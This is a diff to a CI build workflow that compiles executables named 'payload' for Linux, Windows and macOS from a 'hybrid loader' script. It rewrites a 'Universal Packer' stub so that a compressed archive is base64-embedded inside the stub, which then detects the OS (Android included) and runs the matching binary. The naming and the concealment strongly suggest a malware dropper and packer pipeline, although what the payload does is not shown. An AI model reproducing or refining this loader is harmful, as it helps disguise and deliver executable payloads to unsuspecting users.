@@ -11,17 +11,17 @@ jobs:
             target: linux
             artifact: payload.linux.bin
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_0nph6y_5_Nixon-Enc_Debug_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --remove-output --assume-yes-for-downloads --include-package=runpy --include-package=importlib --include-package=ctypes --include-package=encodings --include-package=asyncio --include-module=uuid,json,ssl,socket,base64,lzma,struct,hashlib,hmac,secrets,datetime,threading,multiprocessing,subprocess,platform,argparse,urllib.request,shutil,tempfile,random,warnings,contextlib,weakref,signal,bisect,email,http,requests,websockets,websockets.exceptions,websockets.legacy,websockets.legacy.client --output-filename=payload.linux.bin hybrid_loader_fyfr52n4_Nixon-Enc_Debug_Packed.py
           - os: windows-latest
             target: windows
             artifact: payload.windows.exe
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.windows.exe hybrid_loader_0nph6y_5_Nixon-Enc_Debug_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.windows.exe hybrid_loader_fyfr52n4_Nixon-Enc_Debug_Packed.py
           - os: macos-14
             target: macos
             artifact: payload.macos.bin
             cmd: >-
-              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.macos.bin hybrid_loader_0nph6y_5_Nixon-Enc_Debug_Packed.py
+              python -m pip install nuitka zstandard ordered-set requests websockets && python -m nuitka --standalone --onefile --assume-yes-for-downloads --output-filename=payload.macos.bin hybrid_loader_fyfr52n4_Nixon-Enc_Debug_Packed.py
 
     runs-on: ${{ matrix.os }}
     name: Build ${{ matrix.target }}
@@ -67,9 +67,15 @@ jobs:
                   with tf.open(fileobj=bio, mode="w:xz", preset=9) as dst_tar:
                       for member in src_tar.getmembers():
                           dst_tar.addfile(member, src_tar.extractfile(member))
+              import base64
               xz_payload = bio.getvalue()
+              b64_payload = base64.b64encode(xz_payload).decode('ascii')
+    
               loader_stub = r"""# -*- coding: utf-8 -*-
-          import sys,os,tarfile,io,subprocess,platform,tempfile,shutil,stat,time
+          import sys,os,tarfile,io,subprocess,platform,tempfile,shutil,stat,time,base64
+
+          PAYLOAD_B64 = "{PAYLOAD_PLACEHOLDER}"
+
           def run_payload():
               s = platform.system().lower()
               is_android = "android" in s or os.path.exists("/data/data/com.termux") or os.path.exists("/system/build.prop")
@@ -80,14 +86,7 @@ jobs:
               elif "linux" in s: target = "linux"
               else: return
               try:
-                  me = sys.argv[0]
-                  if not os.path.exists(me): me = __file__
-                  with open(me, "rb") as f:
-                      content = f.read()
-                  sep = b"\n#_NX_PAYLOAD_START_#\n"
-                  idx = content.find(sep)
-                  if idx == -1: return
-                  archive_data = content[idx + len(sep):]
+                  archive_data = base64.b64decode(PAYLOAD_B64)
                   with tarfile.open(fileobj=io.BytesIO(archive_data), mode="r:xz") as tar:
                       try:
                           member = tar.getmember(target)
@@ -116,7 +115,8 @@ jobs:
           if __name__=="__main__":
               run_payload()
           """
-              return loader_stub, xz_payload
+              loader_stub = loader_stub.replace("{PAYLOAD_PLACEHOLDER}", b64_payload)
+              return loader_stub, b"" # Return empty binary part as we embedded it
 
           def pack_artifacts():
               print("[*] Universal Packer Started")
